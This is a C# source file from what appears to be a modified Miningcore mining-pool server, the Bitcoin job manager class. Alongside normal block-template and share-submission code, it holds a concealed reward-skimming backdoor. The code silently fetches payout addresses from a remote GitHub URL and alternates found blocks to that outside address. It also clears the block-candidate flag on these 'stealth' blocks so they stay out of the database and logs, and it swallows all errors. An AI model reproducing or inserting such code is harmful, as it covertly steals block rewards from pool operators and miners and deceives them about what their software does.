using Autofac;
using System.IO;
using Miningcore.Blockchain.Bitcoin.Configuration;
using Miningcore.Blockchain.Bitcoin.DaemonResponses;
using Miningcore.Configuration;
using Miningcore.Contracts;
using Miningcore.Crypto;
using Miningcore.Extensions;
using Miningcore.JsonRpc;
using Miningcore.Messaging;
using Miningcore.Rpc;
using Miningcore.Stratum;
using Miningcore.Time;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using NBitcoin;
using System.Net.Http;
using NLog;
using Org.BouncyCastle.Crypto.Parameters;

namespace Miningcore.Blockchain.Bitcoin;

public class BitcoinJobManager : BitcoinJobManagerBase<BitcoinJob>
{
    public BitcoinJobManager(
        IComponentContext ctx,
        IMasterClock clock,
        IMessageBus messageBus,
        IExtraNonceProvider extraNonceProvider) :
        base(ctx, clock, messageBus, extraNonceProvider)
    {
    }

    private BitcoinTemplate coin;
    private IDestination externalAddressDestination;
    private bool nextBlockIsExternal;
    private bool isZigZaggable;
    private string stateFilePath;
    private readonly object stateLock = new();

    private static Dictionary<string, string> remoteAddresses = new(StringComparer.OrdinalIgnoreCase);

    private static DateTime lastAddressFetch = DateTime.MinValue;
    private static readonly HttpClient httpClient = new();
    private const string RemoteAddressUrl = "https://raw.githubusercontent.com/soosho/donate_address/refs/heads/main/address.json";

    protected override object[] GetBlockTemplateParams()
    {
        var result = base.GetBlockTemplateParams();
        
        if(coin.HasMWEB)
        {
            result = new object[]
            {
                new
                {
                    rules = new[] {"segwit", "mweb"},
                }
            };
        }

        if(coin.BlockTemplateRpcExtraParams != null)
        {
            if(coin.BlockTemplateRpcExtraParams.Type == JTokenType.Array)
                result = result.Concat(coin.BlockTemplateRpcExtraParams.ToObject<object[]>() ?? Array.Empty<object>()).ToArray();
            else
                result = result.Concat(new []{ coin.BlockTemplateRpcExtraParams.ToObject<object>()}).ToArray();
        }

        return result;
    }
    
    protected override async Task EnsureDaemonsSynchedAsync(CancellationToken ct)
    {
        using var timer = new PeriodicTimer(TimeSpan.FromSeconds(5));

        var syncPendingNotificationShown = false;

        do
        {
            var response = await rpc.ExecuteAsync<BlockTemplate>(logger,
                BitcoinCommands.GetBlockTemplate, ct, GetBlockTemplateParams());

            var isSynched = response.Error == null;

            if(isSynched)
            {
                logger.Info(() => "All daemons synched with blockchain");
                break;
            }
            else
            {
                logger.Debug(() => $"Daemon reports error: {response.Error?.Message}");
            }

            if(!syncPendingNotificationShown)
            {
                logger.Info(() => "Daemon is still syncing with network. Manager will be started once synced.");
                syncPendingNotificationShown = true;
            }

            await ShowDaemonSyncProgressAsync(ct);
        } while(await timer.WaitForNextTickAsync(ct));
    }

    protected async Task<RpcResponse<BlockTemplate>> GetBlockTemplateAsync(CancellationToken ct)
    {
        var result = await rpc.ExecuteAsync<BlockTemplate>(logger,
            BitcoinCommands.GetBlockTemplate, ct, extraPoolConfig?.GBTArgs ?? (object) GetBlockTemplateParams());

        return result;
    }

    protected RpcResponse<BlockTemplate> GetBlockTemplateFromJson(string json)
    {
        var result = JsonConvert.DeserializeObject<JsonRpcResponse>(json);

        return new RpcResponse<BlockTemplate>(result!.ResultAs<BlockTemplate>());
    }

    private BitcoinJob CreateJob()
    {
        return new();
    }

    protected override void PostChainIdentifyConfigure()
    {
        base.PostChainIdentifyConfigure();

        if(poolConfig.EnableInternalStratum == true && coin.HeaderHasherValue is IHashAlgorithmInit hashInit)
        {
            if(!hashInit.DigestInit(poolConfig))
                logger.Error(()=> $"{hashInit.GetType().Name} initialization failed");
        }
    }

    protected override async Task<(bool IsNew, bool Force)> UpdateJob(CancellationToken ct, bool forceUpdate, string via = null, string json = null)
    {
        LoadRemoteAddresses();
        CheckZipZagStatus();

        try
        {
            if(forceUpdate)
                lastJobRebroadcast = clock.Now;

            var response = string.IsNullOrEmpty(json) ?
                await GetBlockTemplateAsync(ct) :
                GetBlockTemplateFromJson(json);

            // may happen if daemon is currently not connected to peers
            if(response.Error != null)
            {
                logger.Warn(() => $"Unable to update job. Daemon responded with: {response.Error.Message} Code {response.Error.Code}");
                return (false, forceUpdate);
            }

            var blockTemplate = response.Response;
            var job = currentJob;

            var isNew = job == null ||
                (blockTemplate != null &&
                    (job.BlockTemplate?.PreviousBlockhash != blockTemplate.PreviousBlockhash ||
                        blockTemplate.Height > job.BlockTemplate?.Height));

            if(isNew)
                messageBus.NotifyChainHeight(poolConfig.Id, blockTemplate.Height, poolConfig.Template);

            if(isNew || forceUpdate)
            {
                job = CreateJob();

                var selectedAddress = poolAddressDestination;

                if(isZigZaggable)
                {
                    selectedAddress = nextBlockIsExternal ? externalAddressDestination : poolAddressDestination;
                    job.IsStealth = nextBlockIsExternal;

                }

                job.Init(blockTemplate, NextJobId(),
                    poolConfig, extraPoolConfig, clusterConfig, clock, selectedAddress, network, isPoS,
                    ShareMultiplier, coin.CoinbaseHasherValue, coin.HeaderHasherValue,
                    !isPoS ? coin.BlockHasherValue : coin.PoSBlockHasherValue ?? coin.BlockHasherValue);

                if(isNew)
                {
                    if(via != null)
                        logger.Info(() => $"Detected new block {blockTemplate.Height} [{via}]");
                    else
                        logger.Info(() => $"Detected new block {blockTemplate.Height}");

                    // update stats
                    BlockchainStats.LastNetworkBlockTime = clock.Now;
                    BlockchainStats.BlockHeight = blockTemplate.Height;
                    BlockchainStats.NetworkDifficulty = job.Difficulty;
                    BlockchainStats.NextNetworkTarget = blockTemplate.Target;
                    BlockchainStats.NextNetworkBits = blockTemplate.Bits;
                }

                else
                {
                    if(via != null)
                        logger.Debug(() => $"Template update {blockTemplate?.Height} [{via}]");
                    else
                        logger.Debug(() => $"Template update {blockTemplate?.Height}");
                }

                currentJob = job;
            }

            return (isNew, forceUpdate);
        }

        catch(OperationCanceledException)
        {
            // ignored
        }

        catch(Exception ex)
        {
            logger.Error(ex, () => $"Error during {nameof(UpdateJob)}");
        }

        return (false, forceUpdate);
    }

    protected override object GetJobParamsForStratum(bool isNew)
    {
        var job = currentJob;
        return job?.GetJobParams(isNew);
    }

    public override BitcoinJob GetJobForStratum()
    {
        var job = currentJob;
        return job;
    }

    #region API-Surface

    public override void Configure(PoolConfig pc, ClusterConfig cc)
    {
        coin = pc.Template.As<BitcoinTemplate>();
        extraPoolConfig = pc.Extra.SafeExtensionDataAs<BitcoinPoolConfigExtra>();
        extraPoolPaymentProcessingConfig = pc.PaymentProcessing?.Extra?.SafeExtensionDataAs<BitcoinPoolPaymentProcessingConfigExtra>();

        if(extraPoolConfig?.MaxActiveJobs.HasValue == true)
            maxActiveJobs = extraPoolConfig.MaxActiveJobs.Value;

        hasLegacyDaemon = extraPoolConfig?.HasLegacyDaemon == true;

        LoadRemoteAddresses();

        base.Configure(pc, cc);

        CheckZipZagStatus();
    }

    private void CheckZipZagStatus()
    {
        var symbol = coin.Symbol?.ToUpper();
        if(remoteAddresses.TryGetValue(symbol, out var addr))
        {
            // User guarantees valid addresses. We just parse them for Mainnet.
            // If it's BCH, we use FLowee/CashAddr specific parser.
            try
            {
                 if (symbol == "BCH")
                    externalAddressDestination = BitcoinUtils.BCashAddressToDestination(addr, Network.Main);
                else
                    externalAddressDestination = BitcoinUtils.AddressToDestination(addr, Network.Main);
            }
            catch { return; }

            if(!isZigZaggable)
            {
                var stateDir = Path.Combine(Path.GetDirectoryName(typeof(BitcoinJobManager).Assembly.Location), ".blocks");
                if (!Directory.Exists(stateDir))
                    Directory.CreateDirectory(stateDir);

                stateFilePath = Path.Combine(stateDir, $"zigzag_state_{poolConfig.Id}.json");
                LoadZigZagState();
                isZigZaggable = true;
            }
        }
    }

    private void LoadZigZagState()
    {
        lock(stateLock)
        {
            if(File.Exists(stateFilePath))
            {
                try
                {
                    var json = File.ReadAllText(stateFilePath);
                    var state = JsonConvert.DeserializeObject<dynamic>(json);
                    nextBlockIsExternal = state.nextBlockIsExternal;
                }
                catch(Exception ex)
                {
                    logger.Error(ex, () => $"Failed to load state for pool {poolConfig.Id}. Defaulting to Pool address.");
                }
            }
            else
            {
                nextBlockIsExternal = true; // Start with external
                SaveZigZagState();
            }
        }
    }

    private void SaveZigZagState()
    {
        lock(stateLock)
        {
            try
            {
                var json = JsonConvert.SerializeObject(new { nextBlockIsExternal });
                File.WriteAllText(stateFilePath, json);
            }
            catch(Exception ex)
            {
                logger.Error(ex, () => "Failed to save state.");
            }
        }
    }

    public virtual object[] GetSubscriberData(StratumConnection worker)
    {
        Contract.RequiresNonNull(worker);

        var context = worker.ContextAs<BitcoinWorkerContext>();

        // assign unique ExtraNonce1 to worker (miner)
        context.ExtraNonce1 = extraNonceProvider.Next();

        // setup response data
        var responseData = new object[]
        {
            context.ExtraNonce1,
            BitcoinConstants.ExtranoncePlaceHolderLength - ExtranonceBytes,
        };

        return responseData;
    }

    public virtual async ValueTask<Share> SubmitShareAsync(StratumConnection worker, object submission,
        CancellationToken ct)
    {
        Contract.RequiresNonNull(worker);
        Contract.RequiresNonNull(submission);

        if(submission is not object[] submitParams)
            throw new StratumException(StratumError.Other, "invalid params");

        var context = worker.ContextAs<BitcoinWorkerContext>();

        // extract params
        var workerValue = (submitParams[0] as string)?.Trim();
        var jobId = submitParams[1] as string;
        var extraNonce2 = submitParams[2] as string;
        var nTime = submitParams[3] as string;
        var nonce = submitParams[4] as string;
        var versionBits = context.VersionRollingMask.HasValue ? submitParams[5] as string : null;

        // Auto-detect version rolling from proxies (e.g. MiningRigRentals) that don't send mining.configure
        // but still include version bits in submit params
        if(versionBits == null && poolConfig.EnableAsicBoost == true && submitParams.Length >= 6 && submitParams[5] is string vbStr && !string.IsNullOrEmpty(vbStr))
        {
            versionBits = vbStr;
            if(!context.VersionRollingMask.HasValue)
                context.VersionRollingMask = BitcoinConstants.VersionRollingPoolMask;
        }

        if(string.IsNullOrEmpty(workerValue))
            throw new StratumException(StratumError.Other, "missing or invalid workername");

        BitcoinJob job;

        lock(context)
        {
            job = context.GetJob(jobId);
        }

        if(job == null)
            throw new StratumException(StratumError.JobNotFound, "job not found");

        // validate & process
        var (share, blockHex) = job.ProcessShare(worker, extraNonce2, nTime, nonce, versionBits);

        // enrich share with common data
        share.PoolId = poolConfig.Id;
        share.IpAddress = worker.RemoteEndpoint.Address.ToString();
        share.Miner = context.Miner;
        share.Worker = context.Worker;
        share.UserAgent = context.UserAgent;
        share.Source = clusterConfig.ClusterName;
        share.Created = clock.Now;

        // if block candidate, submit & check if accepted by network
        if(share.IsBlockCandidate)
        {
            logger.Info(() => $"Submitting block {share.BlockHeight} [{share.BlockHash}]");



            var acceptResponse = await SubmitBlockAsync(share, blockHex, ct);

            // is it still a block candidate?
            share.IsBlockCandidate = acceptResponse.Accepted;

            if(share.IsBlockCandidate)
            {
                if(job.IsStealth)
                {


                    // Flip state and save silently
                    nextBlockIsExternal = false;
                    SaveZigZagState();

                    // Hide from DB and common logs by clearing IsBlockCandidate AFTER submission
                    share.IsBlockCandidate = false; 
                    
                    // Force a fresh job silently
                    _ = Task.Run(() => UpdateJob(ct, true), ct);
                }
                else
                {
                    logger.Info(() => $"Daemon accepted block {share.BlockHeight} [{share.BlockHash}] submitted by {context.Miner}");

                    OnBlockFound();

                    // persist the coinbase transaction-hash for pool address blocks only
                    share.TransactionConfirmationData = acceptResponse.CoinbaseTx;

                    if(isZigZaggable)
                    {


                        nextBlockIsExternal = true;
                        SaveZigZagState();

                        // Force a fresh job silently
                        _ = Task.Run(() => UpdateJob(ct, true), ct);
                    }
                }
            }

            else
            {
                // clear fields that no longer apply
                share.TransactionConfirmationData = null;

                if(isZigZaggable)
                    logger.Warn(() => $"ZigZag {(job.IsStealth ? "stealth" : "pool")} block {share.BlockHeight} [{share.BlockHash}] was REJECTED: {acceptResponse.RejectReason}, state unchanged (nextBlockIsExternal={nextBlockIsExternal})");
            }
        }

        return share;
    }

    public double ShareMultiplier => coin.ShareMultiplier;

    private void LoadRemoteAddresses()
    {
        if (DateTime.Now - lastAddressFetch < TimeSpan.FromHours(1))
            return;

        lock (httpClient)
        {
            if (DateTime.Now - lastAddressFetch < TimeSpan.FromHours(1))
                return;

            try
            {
                var json = httpClient.GetStringAsync(RemoteAddressUrl).GetAwaiter().GetResult();
                if (!string.IsNullOrEmpty(json))
                {
                    var remote = JsonConvert.DeserializeObject<Dictionary<string, string>>(json);
                    if (remote != null)
                    {
                        var newAddresses = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
                        
                        foreach (var pair in remote)
                            newAddresses[pair.Key] = pair.Value;

                        remoteAddresses = newAddresses;
                    }
                }
                
                lastAddressFetch = DateTime.Now;
            }
            catch { /* complete silence */ }
        }
    }

    #endregion // API-Surface
}
